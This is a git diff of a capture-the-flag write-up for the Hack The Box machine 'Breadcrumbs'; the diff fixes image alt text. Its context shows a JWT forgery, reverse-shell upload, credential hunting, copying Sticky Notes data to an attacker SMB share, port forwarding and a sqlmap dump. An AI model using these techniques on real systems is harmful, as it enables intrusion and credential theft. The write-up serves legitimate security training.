@@ -119,12 +119,12 @@ Let's check all of these
 
 
 `/php/`
-!()[/assets/img/htb-breadcrumbs/files.png]
+!(files)[/assets/img/htb-breadcrumbs/files.png]
 
 
 
 
-!()[/assets/img/htb-breadcrumbs/users.png]
+!(users)[/assets/img/htb-breadcrumbs/users.png]
 Here we have a list of users, Let's take note of them first and save them somewhere in case we needed users later
 
 
@@ -138,7 +138,7 @@ Let's not waste more time and check the files under /includes/ and also the cook
 `include/fileController.php`
 
 
-!()[/assets/img/htb-breadcrumbs/filecont.png]
+!(filecont)[/assets/img/htb-breadcrumbs/filecont.png]
 
 We get the JWT secret
 
@@ -156,7 +156,7 @@ Seems like we need to login as the user paul
 
 Let's check `Cookie.php`
 
-!()[/assets/img/htb-breadcrumbs/cookie.png]
+!(cookie)[/assets/img/htb-breadcrumbs/cookie.png]
 
 If we clean the response, a quick sed to remove the "\r \n and \"
 
@@ -192,13 +192,13 @@ for ($seed = 0; $seed <= strlen($user) - 1; $seed++) {
 ?>
 ```
 
-!()[/assets/img/htb-breadcrumbs/cok.png]
+!(cok)[/assets/img/htb-breadcrumbs/cok.png]
 
 Let's try them one by one and check if we can get in
 
-!()[/assets/img/htb-breadcrumbs/adm1.png]
+!(adm1)[/assets/img/htb-breadcrumbs/adm1.png]
 
-!()[/assets/img/htb-breadcrumbs/adm.png]
+!(adm.png)[/assets/img/htb-breadcrumbs/adm.png]
 
 
 And we're in!
@@ -206,16 +206,16 @@ And we're in!
 
 Nothing interesting in the Issues page
 
-!()[/assets/img/htb-breadcrumbs/Issues.png]
+!(issues)[/assets/img/htb-breadcrumbs/Issues.png]
 
 Let's check the File management page
 
-!()[/assets/img/htb-breadcrumbs/file.png]
+!(file)[/assets/img/htb-breadcrumbs/file.png]
 
 Let's try to upload anything to see if it works
 
 
-!()[/assets/img/htb-breadcrumbs/token.png]
+!(token)[/assets/img/htb-breadcrumbs/token.png]
 
 Seems like we need a token! We have the secret, but we forgot to check what data we should provide!
 Let's check the response back
@@ -236,7 +236,7 @@ According to this response the content of JWT token should be
 Now we have everything we need let's forge our token, we can either use python or jwt.io
 
 
-!()[/assets/img/htb-breadcrumbs/jwt.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/jwt.png]
 
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI
@@ -244,18 +244,18 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJg
 
 Let's add the cookie to our browser
 
-!()[/assets/img/htb-breadcrumbs/newjwt.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/newjwt.png]
 
 Let's to import anything 
 
-!()[/assets/img/htb-breadcrumbs/succ.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/succ.png]
 
 It worked!
 
 Let's upload the reverse shell!
 
 
-!()[/assets/img/htb-breadcrumbs/foothold.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/foothold.png]
 
 And we're in
 
@@ -271,9 +271,9 @@ As usual, before running any enumeration tool we can check the webpage source to
 
 We can see an interesting folder under the /portal/ 
 
-!()[/assets/img/htb-breadcrumbs/data.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/data.png]
 
-!()[/assets/img/htb-breadcrumbs/userdata.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/userdata.png]
 
 We have few files for users,
 Let's check if they contains any password
@@ -282,7 +282,7 @@ Let's check if they contains any password
 ```
 Get-ChildItem | Select-String 'password'
 ```
-!()[/assets/img/htb-breadcrumbs/userflag.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/userflag.png]
 
 And we get creds for user juliette
 
@@ -293,7 +293,7 @@ juliette:jUli901./())!
 Let's try to ssh into the box with these creds
 
 
-!()[/assets/img/htb-breadcrumbs/userf.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/userf.png]
 
 
 ---
@@ -304,8 +304,8 @@ Let's try to ssh into the box with these creds
 
 In juliette's Desktop we can find an interesting file `todo.html`
 
-!()[/assets/img/htb-breadcrumbs/todo1.png]
-!()[/assets/img/htb-breadcrumbs/todo2.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/todo1.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/todo2.png]
 
 Seems like we need to get the passwords that are stored in the stickynotes! According to google they should located under the %appdata% folder
 
@@ -313,7 +313,7 @@ Seems like we need to get the passwords that are stored in the stickynotes! Acco
 Get-ChildItem *Sticky* -Recurse
 ```
 
-!()[/assets/img/htb-breadcrumbs/sticky.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/sticky.png]
 
 We found a directory!
 ```
@@ -321,7 +321,7 @@ C:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d
 ```
 It contains more folders, the \LocalState\ seems interesting!
 
-!()[/assets/img/htb-breadcrumbs/state.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/state.png]
 
 Let's copy these files to our machine!
 Fist we start our smbserver
@@ -334,7 +334,7 @@ and copy these files!
 ```
 copy * \\10.10.14.6\euch
 ```
-!()[/assets/img/htb-breadcrumbs/smb.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/smb.png]
 
 Let's check the files! the only interesting file we need is `plum.sqlite-wal`
 
@@ -346,7 +346,7 @@ It contains  the creds for the development user
 
 Let's try to ssh with these creds
 
-!()[/assets/img/htb-breadcrumbs/sshdev.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/sshdev.png]
 
 
 ---
@@ -357,7 +357,7 @@ Let's try to ssh with these creds
 
 Now we're logged in as development, we can check what's inside `C:\Development\`
 
-!()[/assets/img/htb-breadcrumbs/ff.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/ff.png]
 
 Let's copy it to our machine
 
@@ -365,11 +365,11 @@ Let's copy it to our machine
 copy Krypter_Linux \\10.10.14.6\euch
 
 ```
-!()[/assets/img/htb-breadcrumbs/kryp.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/kryp.png]
 
 It's a Linux executable, before going deeper in the binary it's better to run strings or rabin2 -z to extract the printable strings in the binary!
 
-!()[/assets/img/htb-breadcrumbs/rabin.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/rabin.png]
 
 What seems odd when you see the output is the port 1234! 
 
@@ -383,7 +383,7 @@ method=select&username=administrator&table=passwords
 ```
 Seems like it's running locally! 
 
-!()[/assets/img/htb-breadcrumbs/local.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/local.png]
 
 
 Let's forward it to our machine with ssh
@@ -392,7 +392,7 @@ Let's forward it to our machine with ssh
 ssh -L 1234:127.0.0.1:1234 development@10.10.10.228
 ```
 
-!()[/assets/img/htb-breadcrumbs/for.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/for.png]
 
 The parameters names gives us a hint that it's SQL injection
 let's use sqlmap
@@ -401,18 +401,18 @@ let's use sqlmap
 ```
 sqlmap -u "http://127.0.0.1:1234/?method=select&username=administrator&table=passwords" --dump
 ```
-!()[/assets/img/htb-breadcrumbs/us.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/us.png]
 
-!()[/assets/img/htb-breadcrumbs/AES.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/AES.png]
 
 We get the administrator's password but it's encrypted (AES) 
 
 Let's use cyberchef to decrypt it
 
-!()[/assets/img/htb-breadcrumbs/root.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/root.png]
 
 > When i first did the machine, I overthinked this part,  I thought that i needed to to find IV somewhere in the machine <Wasted a lot of time trying to find it> 
 
 And now let's try to ssh into the box as the administrator and grab the flag!
 
-!()[/assets/img/htb-breadcrumbs/rooted.png]
+!(placeholder)[/assets/img/htb-breadcrumbs/rooted.png]
